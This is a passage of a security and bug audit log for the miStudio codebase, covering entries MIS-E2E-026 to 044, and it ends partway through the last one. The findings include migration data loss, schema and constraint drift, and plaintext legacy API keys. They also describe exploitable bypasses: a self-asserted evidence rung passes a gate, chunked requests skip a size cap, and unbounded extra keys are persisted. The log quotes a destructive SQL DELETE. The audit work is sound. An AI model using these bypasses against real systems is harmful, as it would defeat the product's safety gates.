- **Claim:** The CI test step excludes nine test files, with a comment saying they have "pre-existing failures where components were refactored but tests weren't updated". **All nine now pass.** A full local `npx vitest run` on clean `main` returns **65 files / 1211 tests / 1211 passed / 0 failed**, which includes all nine. Those nine carry **329 tests — 27% of the entire frontend suite** — and none of them gates a merge.
- **Failure scenario:** The excluded files cover `DatasetCard` (49 tests), `TrainingCard` (49), `ActivationExtractionConfig` (41), `ModelDownloadForm` (39), `DownloadForm` (37), `DatasetDetailModal` (35), `ModelCard` (34), `DatasetsPanel` (28) and `useTrainingWebSocket` (17) — the download forms that handle HF access tokens, the training card, and the WebSocket hook whose resubscribe bug this repo has already been bitten by once. A regression in any of them merges green. The exclusion was a temporary measure whose reason expired, and because CI stayed green nothing signalled that.
- **Evidence:** verified-by-live-repro — full local run passes 1211/1211; per-file `it(`/`test(` counts sum to 329; the workflow's exclude list read at `frontend-ci.yml:53-60`
- **Doc reference:** none
- **Verification (R3):** pending — re-run the exact CI command locally to confirm the excludes parse as intended and that removing them leaves CI green
- **Proposed remediation:** Delete the nine `--exclude` flags and the stale comment. If any file then fails in CI but not locally, that difference is itself the finding.
- **Effort:** S

---

### MIS-E2E-026 — One `:?` in Compose breaks every `docker compose` command
- **Phase / Round:** P00 / baseline
- **Source:** baseline measurement
- **Severity:** P2
- **Type:** bug
- **Location:** `docker-compose.yml:151` — `MCP_AUTH_TOKEN: ${MCP_AUTH_TOKEN:?set MCP_AUTH_TOKEN in .env to enable the MCP server}`
- **Claim:** `mcp-server` is profile-gated (`profiles: ["mcp"]`) so it does not start by default, but Compose evaluates `${VAR:?msg}` during **file interpolation**, before profile filtering. With no root `.env` — and there is none in the repo, only `.env.example` — *every* command against `docker-compose.yml` aborts. Measured: `docker compose ps`, `docker compose config --services` and `docker compose logs postgres` all fail, as does `docker compose up -d redis`.
- **Failure scenario:** A fresh clone cannot run any `docker compose` command against the main compose file, including read-only ones, and the error names a service the user never asked to start. The intent — "the MCP port must not open without a token" — is right; the mechanism is scoped wrongly.
- **Evidence:** verified-by-live-repro (three commands, all non-zero; `ls .env` → not found)
- **Doc reference:** `README.md` / `CLAUDE.md` startup instructions
- **Verification (R3):** pending
- **Proposed remediation:** Move the required-token check inside the `mcp` profile's own entrypoint, or use `${MCP_AUTH_TOKEN:-}` in the file and let the MCP server refuse to start on an empty token — which `server.py:105-110` already does correctly.
- **Effort:** S
- **Mitigating:** `start-mistudio.sh:229` uses `docker-compose.dev.yml`, which has no `:?` operator, so the documented startup path is unaffected. That is also why this has gone unnoticed.

---

### MIS-E2E-027 — Two API tests reach a real Redis and dispatch a real Celery task
- **Phase / Round:** P00 / baseline
- **Source:** baseline measurement
- **Severity:** P2
- **Type:** test-gap
- **Location:** `backend/tests/api/v1/endpoints/test_datasets.py::TestDownloadDataset::{test_download_dataset_success,test_download_dataset_with_access_token}`
- **Claim:** Both tests fail on a machine where Redis is not running, with `ConnectionRefusedError` raised from `celery.backends.redis.ResultConsumer` — so the endpoint under test dispatches a real Celery task to a real broker and then subscribes to its result channel. They are not unit tests; they are integration tests sitting in the unit path, and they depend on ambient infrastructure that nothing in the suite provisions or asserts.
- **Failure scenario:** The suite's pass/fail depends on what happens to be running on the developer's machine. Worse in the other direction: when Redis *is* up, these tests enqueue real work onto the same broker a live Celery worker may be consuming, so running the test suite can start an actual dataset download.
- **Evidence:** verified-by-live-repro — failed with Redis down, and the traceback names `redis.connection.Connection(host=localhost,port=6379)` and `celery/backends/redis.py:180 self._pubsub.subscribe(key)`
- **Doc reference:** PADR testing standards (unit vs integration separation); `pyproject.toml` markers `unit`/`integration`
- **Verification (R3):** pending — confirm against a re-run with Redis up
- **Proposed remediation:** Mock the task dispatch (the other endpoint tests do), or move both to `tests/integration/` and mark them `@pytest.mark.integration`.
- **Effort:** S

---

### MIS-E2E-028 — The deployed app reports its version as "unknown"
- **Phase / Round:** P00 / baseline
- **Source:** live probe
- **Severity:** P3
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/version.py:9-19` (`_read_version`); `backend/Dockerfile:68` (`COPY --chown=mistudio:mistudio . .`); `VERSION` at repo root
- **Claim:** `GET /api/v1/version` on the live k8s deployment returns `{"version":"unknown","app":"miStudio"}`. `_read_version()` probes three candidate paths for a `VERSION` file and falls back to the literal string `"unknown"`. The Dockerfile's build context is `backend/`, and `VERSION` lives at the **repo root** — there is no `backend/VERSION` — so the file never enters the image. In the container the module sits at `/app/src/api/v1/endpoints/version.py`, so the three candidates resolve to `/VERSION`, `/app/VERSION` and `/app/src/VERSION`, none of which exists.
- **Failure scenario:** The endpoint that exists to answer "which build is this?" cannot answer it in the only environment where the question matters. Every deployed instance reports the same `"unknown"`, so a version check cannot distinguish a stale pod from a current one — and the fallback is a plausible-looking string rather than an error, so nothing surfaces the failure.
- **Evidence:** verified-by-live-repro — `curl http://k8s-mistudio.hitsai.local/api/v1/version` returns the literal above; `ls backend/VERSION` → not found; `cat VERSION` → `0.5.0`
- **Doc reference:** none
- **Verification (R3):** CONFIRMED at baseline
- **Proposed remediation:** Bake the version in at build time — a Docker `ARG`/`ENV` from the workflow, or a build step that copies `VERSION` into the context. Then make the fallback loud: returning `"unknown"` silently is what let this sit.
- **Effort:** S

---

## P01 — Data layer & migrations

---

### MIS-E2E-029 — A capture store over 2 GiB overflows a 32-bit column and strands the run
- **Phase / Round:** P01 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/models/circuit_runs.py:52` (`bytes_total`, `events_total` declared `Integer`)
- **Claim:** `bytes_total` counts the size of a circuit-capture store in bytes and is a 32-bit `Integer`, so it caps at 2,147,483,647 (~2 GiB). A capture larger than that raises on the final commit.
- **Failure scenario:** The capture completes, all the work is done, and the last write fails with a numeric-overflow error. That poisons the SQLAlchemy session, so the task's own error handler — which needs the same session to mark the run failed — fails too. The run is left at `running` forever with `store_path` never set, and because nothing points at the directory, the multi-gigabyte store on disk is leaked with no owner. Per-token multi-layer SAE activations over a real corpus reach this size readily.
- **Evidence:** plausible (read-only) — the column type is verified; the overflow threshold is arithmetic; the session-poisoning consequence is inferred from the commit ordering
- **Doc reference:** PADR IDL-32 (position-carrying sparse capture)
- **Verification (R3):** pending
- **Proposed remediation:** `BigInteger` for both, with a migration. Separately, the error handler should use a fresh session so a poisoned one cannot swallow the failure record.
- **Effort:** S

---

### MIS-E2E-030 — The analysis cache blind-INSERTs against a unique constraint
- **Phase / Round:** P01 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/analysis_service.py:866` (`_cache_analysis`); constraint `UNIQUE (feature_id, analysis_type)` in the migration
- **Claim:** `_cache_analysis` inserts a new cache row without an upsert or an existence check, while the database holds a unique constraint on `(feature_id, analysis_type)`. Cache rows carry a 7-day expiry but are **never pruned**, so the row from the first request is still present when the second one comes.
- **Failure scenario:** Two paths reach it. (1) A cached analysis passes its 7-day expiry: the read treats it as stale and recomputes, the write hits the surviving row, and the insert raises. (2) Two concurrent requests for the same feature race and the second insert raises. Either way logit lens, correlations and ablation return 500 **permanently** for that feature — the failure is sticky, because the row that causes it is never removed. A feature that worked yesterday stops working with no state change from the user.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-9 (NLP analysis for feature discovery)
- **Verification (R3):** pending — reproducible against the live app by requesting an expired analysis
- **Proposed remediation:** Postgres `ON CONFLICT (feature_id, analysis_type) DO UPDATE`. Add the missing prune for expired rows.
- **Effort:** S

---

### MIS-E2E-031 — Two unique constraints exist in the DB but not in the ORM, so tests run without them
- **Phase / Round:** P01 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/models/feature_analysis_cache.py:42` (missing `UNIQUE (feature_id, analysis_type)`); `backend/src/models/feature.py` (missing `uq_features_extraction_neuron`)
- **Claim:** Both constraints are created by migrations and enforced in the real database. Neither is declared on the ORM model. The unit suite builds its schema with `Base.metadata.create_all()`, so **the tests run against a database that does not have these constraints**.
- **Failure scenario:** This is why MIS-E2E-030 has no failing test. A test that exercises `_cache_analysis` twice passes locally — the second insert simply succeeds, because the constraint that would reject it was never created. The suite is structurally incapable of catching this bug class, and it will stay incapable for any future constraint added by migration only. Fixtures agreeing by construction, in its purest form: the test schema and the production schema are different schemas.
- **Evidence:** plausible (read-only) — model definitions and migration DDL both read; the `create_all` path is confirmed in `conftest.py`
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling)
- **Verification (R3):** **CONFIRMED — from `Base.metadata` itself**, which is the authority on what `create_all` builds:
  ```
  feature_analysis_cache: unique=NONE      # DB has uq_feature_analysis_cache_feature_type
  features:               unique=NONE      # DB has uq_features_extraction_neuron
  ```
  Both constraints exist in the live database (queried via `pg_constraint`) and neither is in the ORM, so the unit suite's schema provably lacks them.
- **Proposed remediation:** Declare both constraints on the models (they belong there regardless), and add a guard test that diffs `Base.metadata` against the migrated schema so the next migration-only constraint cannot diverge silently.
- **Effort:** M

---

### MIS-E2E-032 — Startup schema validation checks 15 of 36 tables and passes on a broken database
- **Phase / Round:** P01 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/db/schema_validator.py:18` (`REQUIRED_TABLES`)
- **Claim:** `REQUIRED_TABLES` is a hand-maintained list of 15 table names. The ORM defines 36. Every table added in the last year — `circuits`, `dismissed_operations`, `steering_record_runs`, `cluster_profiles`, `validation_manifests` and the rest — is unchecked. The validator logs **"Schema validation passed"** on a database missing all of them.
- **Failure scenario:** The mechanism exists specifically to catch a database that has not been migrated, and it reports success on exactly that database. Compounded by `main.py:60`, where a validation *failure* only logs a warning and lets startup continue — so the check is both incomplete and non-blocking. A pod serving against an unmigrated database starts cleanly and fails later, at request time, per feature.
- **Evidence:** verified-by-live-repro (list of 15 counted against 36 ORM tables)
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling) — the IDL this directly implements
- **Verification (R3):** pending
- **Proposed remediation:** Derive `REQUIRED_TABLES` from `Base.metadata.tables` so it cannot drift — the same "derive from the registry, not a hand-list" rule the MCP reachability harness already applies. Then decide deliberately whether a missing table should be fatal at startup.
- **Effort:** S

---

### MIS-E2E-033 — The ORM declares three foreign keys the database does not have
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit) + direct DB verification
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/models/feature.py:43` and `backend/src/models/extraction_job.py:42` (`ForeignKey("trainings.id", ondelete="CASCADE")`); `backend/src/models/feature.py:59-64` (`ForeignKey("labeling_jobs.id", ondelete="SET NULL")`); `backend/alembic/versions/j6k7l8m9n0o1_make_extraction_training_id_nullable.py:63-65`, `:84-86`
- **Claim:** Migration `j6k7l8m9n0o1` drops `extraction_jobs_training_id_fkey` and `features_training_id_fkey` and **no later migration re-creates them**. Separately, `features.labeling_job_id` was added by `6819dd3caeb3:81-84` as a plain indexed `String(255)` with **no `ForeignKeyConstraint` ever**. All three FKs are still declared on the ORM models.
- **Verified against the running database:**
  ```
  $ docker exec mistudio-postgres psql -U postgres -d mistudio -tA -c \
      "SELECT conname, conrelid::regclass FROM pg_constraint
       WHERE contype='f' AND conrelid::regclass::text IN ('features','extraction_jobs');"
  features_extraction_job_id_fkey    | features
  fk_features_external_sae_id        | features
  fk_extraction_jobs_external_sae_id | extraction_jobs
  ```
  `features.training_id`, `extraction_jobs.training_id` and `features.labeling_job_id` all **exist as columns** and **none of them carries a foreign key**. Three declared, zero present.
- **Failure scenario:** Production has no referential integrity on any of the three. A dangling `training_id` is insertable; deleting a labeling job leaves `features.labeling_job_id` pointing at nothing, and the `SET NULL` never fires because `ondelete=` is DDL-only — it does nothing without the constraint. Partially compensated by `TrainingService.delete_training` deleting children by hand and by ORM-level `cascade="all, delete-orphan"`, so ORM-mediated deletes still clean up; any raw-SQL or bulk path does not.
- **Why no test catches it:** the unit suite builds its schema with `Base.metadata.create_all()`, which reads the **ORM**. So the tests run against a database that *has* all three CASCADE/SET NULL constraints while production has none. The test schema and the production schema are different schemas — the same root cause as MIS-E2E-031, now confirmed on three more constraints.
- **Evidence:** **verified-by-live-repro** — DB queried directly; the sub-audit's own caveat ("I did not execute alembic upgrade head against a scratch database") is hereby discharged
- **Doc reference:** PADR IDL-16
- **Verification (R3):** **CONFIRMED from both ends.** The live database (via `pg_constraint`) carries two FKs on `features`; `Base.metadata` — what `create_all` builds for the tests — carries four:
  ```
  ORM (test schema):  external_sae_id→CASCADE, extraction_job_id→CASCADE,
                      labeling_job_id→SET NULL, training_id→CASCADE
  DB  (production):   fk_features_external_sae_id, features_extraction_job_id_fkey
  ```
  Combined with MIS-E2E-031, **one table's test schema differs from production in both directions at once**: it has two foreign keys production lacks, and lacks a unique constraint production has.
- **Proposed remediation:** Re-create the three constraints in a migration, or drop them from the ORM — but pick one. Then add the `Base.metadata` vs migrated-schema diff guard from MIS-E2E-031, which would have caught all five divergences at once.
- **Effort:** M

---

### MIS-E2E-034 — A circuit's dial escapes the ceiling its own published schema declares
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P1
- **Type:** bug
- **Location:** `docs/schemas/circuit-definition-v1.json` `#/$defs/CircuitBudget` L41-54; `backend/src/schemas/circuit_definition.py:163-185` (`_dial_within_range`)
- **Claim:** `intensity` declares `maximum: 2.0`. Its sibling `intensity_range` is a bare `array of number` — no `minItems`, no `maxItems`, no element bounds. `_dial_within_range` is a `mode="after"` validator that clamps by **assigning** `self.intensity = lo`, and the model has no `validate_assignment`, so the assignment bypasses the `le=2.0` field constraint entirely.
- **Failure scenario:** Verified empirically by the reviewer: `{"intensity": 1.0, "intensity_range": [8.0, 10.0]}` **passes `jsonschema.validate` against the published file**; after pydantic parsing `intensity == 8.0`; and the re-export then **fails the very schema miStudio ships** — *"8.0 is greater than the maximum of 2.0"*. `[-500,-400]` yields a negative dial of `-400.0`; `[1e9,1e9]` yields `1e9`. Reachable through `POST /circuits/import` → `CircuitService.create` → persisted to `circuits.budget` JSONB → re-exported by `to_definition`. So miStudio stores a dial 4× over its declared ceiling and publishes documents that violate its own contract.
- **Containment:** miLLM's mirror has `ge=0.0, le=2.0` (`millm/api/schemas/circuit.py:123`) and `millm/core/steering_range.py` intersects any authored range with `[0,2]`, so this does **not** produce overdrive on the serving path. The damage is miStudio-local integrity plus contract conformance. Related: `ProfileBudget.intensity_range` has **no validator at all** in either file — `[]`, `[1,2,3,4,5]`, `[10,-10]` all accepted.
- **Evidence:** verified-by-live-repro (reviewer executed `jsonschema.validate` and the pydantic round-trip)
- **Doc reference:** PADR IDL-33, IDL-37
- **Strengthened at P01 R1 (/review):** the code states the invariant it does not enforce. `_dial_within_range`'s own docstring reads *"The calibration guarantee ('a served dial cannot exceed the cliff') rests on `intensity_range` being the true envelope AND `intensity` sitting inside it."* It enforces the second half and assumes the first, while the published schema leaves `intensity_range` completely unbounded — so "the true envelope" can be `[8, 10]`. `circuit_service.py:370-373` then leans on it in turn: *"The intensity∈range invariant is now enforced by `CircuitBudget` itself, so `update()`'s contract validation catches any bad clamp for BOTH this and the sync path."* Two call sites delegate the guarantee to a validator whose own precondition is unchecked.
- **Verification (R3):** **CONFIRMED — reproduced independently.** Executed against the real contract and the real published file:
  ```
  published schema accepts {intensity:1.0, intensity_range:[8,10]}: YES
  pydantic result: intensity = 8.0        (field declares le=2.0)
  re-export FAILS its own published schema: 8.0 is greater than the maximum of 2.0
  intensity_range=[-500,-400] -> intensity = -400.0
  intensity_range=[1e9,1e9]   -> intensity = 1000000000.0
  ```
  A schema-valid document in, a schema-invalid document out, and the dial reaches 1e9 and -400.
- **Proposed remediation:** Bound `intensity_range` elements to `[0, 2]` with `minItems: 2, maxItems: 2` in the schema, **and** re-validate `intensity` after the clamp (or clamp to `min(lo, 2.0)`), so neither layer alone is load-bearing.
- **Effort:** S

---

### MIS-E2E-035 — The evidence rung is self-asserted by the imported document and nothing verifies it
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P1
- **Type:** security
- **Location:** `docs/schemas/circuit-definition-v1.json` `#/$defs/CircuitEdge/properties/rung` L407-410 and `validation_manifest_ref` L444-455; `backend/src/api/v1/endpoints/circuits.py` import path; `CircuitService.create`
- **Claim:** `rung` correctly **defaults** to `0` (mined, lowest). But nothing verifies a document that simply writes `"rung": 3`. `validation_manifest_ref` — the field that would let a consumer check the claim — is a free-form string that is **never dereferenced or verified**, in miStudio or in miLLM. On import, `CircuitService.create` sets `circuit.rung = int(defn.displayed_rung())` verbatim.
- **Failure scenario:** The evidence ladder is this product's central honesty mechanism, and the documented gate is *"a circuit below rung 2 is REFUSED unless you pass `acknowledge_unvalidated`"*. That gate reads a number the document asserts about itself. A hand-authored circuit-definition with `"rung": 3` and no manifest imports cleanly, displays as faithfulness-tested, and passes the activation gate — with no causal validation ever having been run. `effect_size` is likewise unbounded and unverified (accepted `9999.0`) and feeds the hazard quantification that steering strength is derived from.
- **Evidence:** verified-by-live-repro (reviewer confirmed `displayed_rung()` returns 3 for a hand-authored doc; grep confirms `validation_manifest_ref` has no dereferencing consumer)
- **Doc reference:** PADR IDL-33, IDL-35 (the evidence ladder as the product-wide claims model)
- **Verification (R3):** **CONFIRMED — verified without touching production.** `CircuitDefinitionV1.displayed_rung()` is `circuit_rung([e.rung for e in self.edges])`, and `circuit_rung` returns `min(int(r) for r in edge_rungs)`. Executed: `circuit_rung([3,3,3]) -> 3`. The MIN aggregation is a *good* conservative choice, but it aggregates values the document asserts about itself. Independently confirmed that **`validation_manifest_ref` is written and never read**: it is set at `circuit_service.py:183` and `circuit_intervention_service.py:512`, and neither `api/v1/endpoints/circuits.py` nor `circuit_service.py` so much as imports `ValidationManifest`. The product knows this — the MCP docstring at `mcp_server/tools/circuits.py:66` says *"validation_manifest_ref all null: the RUNG survives the export"*.
- **Proposed remediation:** On import, either resolve `validation_manifest_ref` and recompute the rung from the manifests actually present, or **clamp the imported rung to what the document can prove** and record the asserted value separately as a claim. A rung that cannot be checked should not be the thing a gate reads.
- **Effort:** M
- **Note:** this is a trust-boundary finding, not a memory-safety one. It is recorded as `security` because the rung is used as an authorization decision.

---

### MIS-E2E-036 — The circuit import size cap is skipped for chunked requests
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/circuits.py:161-168`
- **Claim:** The guard reads `content_length = request.headers.get("content-length")` and only applies `MAX_IMPORT_BYTES` `if content_length:`. A chunked `Transfer-Encoding` request sends no `Content-Length`, so the cap never applies and the full body is parsed.
- **Failure scenario:** The cap is trivially bypassed by any client that streams. The cluster endpoint gets this right at `cluster_profiles.py:160` by measuring the **parsed** payload rather than trusting a header — that precedent exists in the same codebase and was not copied.
- **Evidence:** plausible (read-only) — the header-conditional is verified; not yet exercised against a chunked request
- **Doc reference:** none
- **Verification (R3):** pending — send a chunked oversized import to the live app
- **Proposed remediation:** Measure the parsed payload, as `cluster_profiles.py:160` already does.
- **Effort:** S

---

### MIS-E2E-037 — The calibration block is silently dropped on circuit import
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/circuits.py:188-204`; `CircuitService.create` accepts `calibration` at `circuit_service.py:212`; the column exists at `models/circuit.py:48`
- **Claim:** The import handler builds the `CircuitService.create` kwargs without a `calibration` key. The service accepts one and the column exists — the field is simply not passed. The whole calibrated-band block (`onset`, `sweet_spot`, `cliff`, `probe_set`, and the `provisional` honesty marker) is lost on round-trip.
- **Failure scenario:** Export a calibrated circuit, import it back, and the calibration evidence is gone while `budget.intensity_range` still carries the clamped numbers it produced. The dial keeps the bounds; the measurement that justified them, and the `provisional` flag that says how much to trust them, do not survive. A consumer sees a clamped range with no visible basis — the honesty marker is exactly what is dropped. This also breaks the BR-013 round-trip property the contract claims.
- **Evidence:** plausible (read-only) — the missing key is verified by reading both the caller and the callee signature
- **Doc reference:** PADR IDL-37 (calibration carriage in the contract); 019_FPRD
- **Verification (R3):** **CONFIRMED at source.** `CircuitService.create` reads `data.get("calibration")` (`circuit_service.py:224`); the import endpoint's dict at `circuits.py:190-205` has no such key while passing every other contract field. The service is fully wired to carry it — `circuit_service.py:234` does `calibration=(defn.calibration.model_dump(...) if defn.calibration else None)`. One missing dict key on one path.
- **Confirmed as an IDL-conformance break at P01 R1 (/review):** IDL-37 clause 5 states the reason the block exists — *"the probe set travels in the contract so a one-shot re-verify at serve time is cheap."* Dropping `calibration` on import means the probes do not travel, so the cheap re-verify the decision was written to enable is not possible for any imported circuit. Clause 4's other two requirements **do** conform: `circuit_service.py:375-376` sets `budget["intensity_range"] = [onset, cliff]` and `budget["intensity"] = sweet`, exactly as the IDL specifies. So the write path implements the decision and the read path discards it.
- **Verification (R3):** pending — export → import → export a calibrated circuit against the live app and diff
- **Proposed remediation:** Pass `calibration=defn.calibration`. Then add a **round-trip equality test** over the whole document, which is the guard that would have caught this and will catch the next dropped field.
- **Effort:** S

---

### MIS-E2E-038 — A data-cleanup migration deletes every occurrence of a common word, irreversibly
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/alembic/versions/678f7e8bbeb6_cleanup_duplicate_prime_tokens.py:77`, `:84`
- **Claim:** The migration intends to remove **one** erroneously duplicated copy of the prime token from a feature's context window. It is written as `new_prefix = [t for t in prefix_tokens if t != prime_token]`, which removes **every** occurrence of that token string from both `prefix_tokens` and `suffix_tokens`.
- **Failure scenario:** Prime tokens are frequently common words — ` the`, ` of`, ` in`, or a repeated content word. Every legitimate second occurrence in the surrounding context is silently deleted from every affected row of `feature_activations`. Two aggravating factors: (1) `prime_activation_index` is a **positional index into that same context** and is not recomputed, so removing prefix elements shifts every position after it — and that index is read straight into labeling prompts at `labeling_service.py:280,365,456`, so a mis-indexed context feeds the LLM that writes the feature's label; (2) lines 74-75 write `None` when the filtered list is empty, turning `[]` into SQL `NULL`. `downgrade()` is an explicit no-op whose own comment says *"the original corrupt data cannot be reconstructed."*
- **Evidence:** plausible (read-only) — the over-broad filter is unambiguous in the code; the index-desync consequence is inferred from the ordering
- **Doc reference:** PADR IDL-9; the span-highlighting work (`context_parts`)
- **Verification (R3):** pending — query `feature_activations` for rows whose `prime_activation_index` exceeds `len(prefix_tokens)`, which would be direct evidence the desync happened
- **Proposed remediation:** Already-run migration, so the fix is forward: detect and repair desynced rows, and re-derive contexts where possible. Record the data loss honestly rather than leaving it implicit.
- **Effort:** M

---

### MIS-E2E-039 — A downgrade deletes all user tokenizations under a comment claiming it deletes none
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/alembic/versions/2e1feb9cc451_migrate_existing_tokenizations_to_new_.py:131-148`
- **Claim:** The downgrade runs `DELETE FROM dataset_tokenizations WHERE dataset_id IN (SELECT id FROM datasets WHERE tokenized_path IS NOT NULL)`. Its docstring says *"This only removes records that were created by this migration. Any tokenizations created after this migration won't be affected."* There is no marker column distinguishing migration-created rows, so that is false: it deletes **every** tokenization for any dataset with a non-null `tokenized_path`, and the table is keyed per `(dataset_id, model_id, max_length)` — so all of a user's later work for that dataset goes.
- **Failure scenario:** Run standalone or out of order, it destroys user data while the comment tells the operator it is safe. Run in the real chain, the child revision `7282abcac53a` downgrades first and re-adds `tokenized_path` as an empty nullable column, so `IS NOT NULL` matches nothing and the delete is a silent no-op. Either destructive or useless — and the accompanying *"safe downgrade since the data still exists in the datasets table"* is wrong in both cases.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Make the downgrade refuse rather than guess, or mark migration-created rows so the claim can be true.
- **Effort:** S

---

### MIS-E2E-040 — A schema migration drops four data-bearing columns without copying them
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/alembic/versions/c8c7653233ee_update_models_table_schema.py:34-35` (adds), `:96-100` (drops)
- **Claim:** The upgrade adds `memory_required_bytes` (BigInteger) and `architecture_config` (JSONB), then drops `memory_req_bytes`, `extra_metadata`, `hidden_dim` and `num_heads` — with **no `UPDATE` copying values across**. `memory_req_bytes` → `memory_required_bytes` is a pure rename that loses its data; `extra_metadata` (JSONB) is dropped with `architecture_config` left NULL.
- **Failure scenario:** Any model row that had those values lost them at upgrade time. Historical, so the loss has already happened; recorded because it is unrecoverable and because the same pattern would repeat. The downgrade is separately unusable — `:145` narrows `file_path` 1000→512 and `:168` narrows `name` 500→255 (Postgres raises rather than truncating), `:172` converts `id` String→UUID with no `USING`, and `:126` re-adds `extra_metadata` as `nullable=False` with no default.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending — check whether any current `models` row has a NULL `architecture_config` that should have had content
- **Proposed remediation:** Forward-only. Record the loss; add a review rule that a drop paired with an add in the same migration must carry an explicit copy or an explicit "no data to preserve" note.
- **Effort:** S

---

### MIS-E2E-041 — Plaintext OpenAI keys can persist forever, and decryption is built to hide it
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P1
- **Type:** security
- **Location:** `backend/alembic/versions/6819dd3caeb3_create_labeling_jobs_table.py:41` (`openai_api_key` as plain `String(500)`); `backend/src/services/labeling_service.py:191` (service-layer `encrypt_value`, added later); `backend/src/core/encryption.py:62-92` (`decrypt_value`)
- **Claim:** The credential column was created plaintext and encryption was added later, at the service layer only. **No migration ever encrypts pre-existing rows.** And `decrypt_value` fails open by design — its own docstring says it *"returns the value as-is… This handles rows that were saved plaintext under an earlier code path despite being flagged is_sensitive."*
- **Failure scenario:** Any `labeling_jobs` row written before the service-layer encryption landed still holds a plaintext OpenAI API key. Because `decrypt_value` returns unrecognised input unchanged, that row **works perfectly** — the application reads the plaintext key, uses it, and nothing anywhere flags that it was never encrypted. The fail-open behaviour is what makes the gap permanent: there is no code path that can ever notice. The same swallow also hides `InvalidTag` (MIS-E2E-004), so the two findings share a root cause and should be fixed together.
- **Evidence:** verified-by-live-repro for the absence of a backfill (grepped the whole versions tree); plausible for live exposure, which depends on row age
- **Doc reference:** PADR IDL-20 (AES-256-GCM), IDL-25
- **Verification (R3):** pending — query `labeling_jobs` for non-null `openai_api_key` values that do not base64-decode to a valid envelope; that count is the exposure
- **Proposed remediation:** Add a backfill that encrypts or nulls legacy rows, and make `decrypt_value` distinguish "not an envelope" (legacy — return as-is, but **log a counter**) from `InvalidTag` (raise). The counter is what turns an invisible gap into a fixable one.
- **Effort:** M
- **Related:** MIS-E2E-004

---

### MIS-E2E-042 — Extra keys in `meta` are persisted unbounded and re-exported
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P2
- **Type:** security
- **Location:** `docs/schemas/{circuit,cluster}-definition-v1.json` — `MemberMeta` and `MemberExample` set `additionalProperties: true`; `CircuitEdge.type_signals` likewise
- **Claim:** 0 of 23 objects in the circuit schema and 0 of 10 in the cluster schema set `additionalProperties: false`. For the absent ones pydantic's default `extra="ignore"` genuinely tightens them — verified. The real gap is the **two models declared `extra="allow"`**: a 100,000-character `evil_key` inside `meta` survives validation, and `from_definition` does `members=[m.model_dump() …]` into a JSONB column, so arbitrary attacker-controlled keys with unbounded values are **persisted and re-exported**.
- **Failure scenario:** A shared circuit-definition — the artifact this product is explicitly designed to exchange, including via a HuggingFace marketplace — carries an arbitrary payload through miStudio's database and back out to the next consumer. Not XSS in miStudio's own UI (no `dangerouslySetInnerHTML`, no `rehype-raw`, React escapes), so the risk is storage growth and propagation into a downstream renderer that is less careful.
- **Evidence:** verified-by-live-repro (reviewer round-tripped an oversized extra key)
- **Doc reference:** PADR IDL-30, IDL-33; the cluster MemberMeta contract is deliberately extensible
- **Verification (R3):** pending
- **Proposed remediation:** Keep `meta` extensible — that is a deliberate contract decision — but cap it: a `maxLength` on permitted extra values, or a total serialized-size limit on `meta`, enforced at import.
- **Effort:** S

---

### MIS-E2E-043 — The import path bypasses the length guards the create path has
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `docs/schemas/cluster-definition-v1.json` L48-59 (`display_token`, no `maxLength`); `DefinitionModelRef.hf_id` / `mistudio_model_id`; `ProfileMember.label`; `backend/src/api/v1/endpoints/circuits.py:195`
- **Claim:** The contract models put no `maxLength` on several strings that land in fixed-width columns — `cluster_profiles.display_token` is `String(255)`, `circuits.model_hf_id` is `String(500)`, `circuits.model_id` is `String(255)`. The **create** body guards this correctly (`circuits.py:43`, `model_hf_id: Field(None, max_length=500)`); the **import** path at `circuits.py:195` passes `defn.model.hf_id` raw.
- **Failure scenario:** An oversized value reaches Postgres and raises, so the user gets a 500 where a 422 was available and correct. Verified: 5,000,000-character `display_token` and `label` accepted by the contract models. The guard exists ten lines away on the sibling path — this is a single-site fix that was not generalized, the anti-pattern this repo has recorded before.
- **Evidence:** verified-by-live-repro (reviewer constructed oversized values and confirmed acceptance)
- **Doc reference:** PADR IDL-30, IDL-33
- **Verification (R3):** pending
- **Proposed remediation:** Put the `max_length` on the **contract models**, so both paths inherit it rather than one path remembering.
- **Effort:** S

---

### MIS-E2E-044 — The published schemas carry an internal domain as their canonical `$id`
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P3
- **Type:** security
- **Location:** `docs/schemas/circuit-definition-v1.json:1386`, `docs/schemas/cluster-definition-v1.json:638` — `$id: "https://mistudio.hitsai.net/schemas/…"`
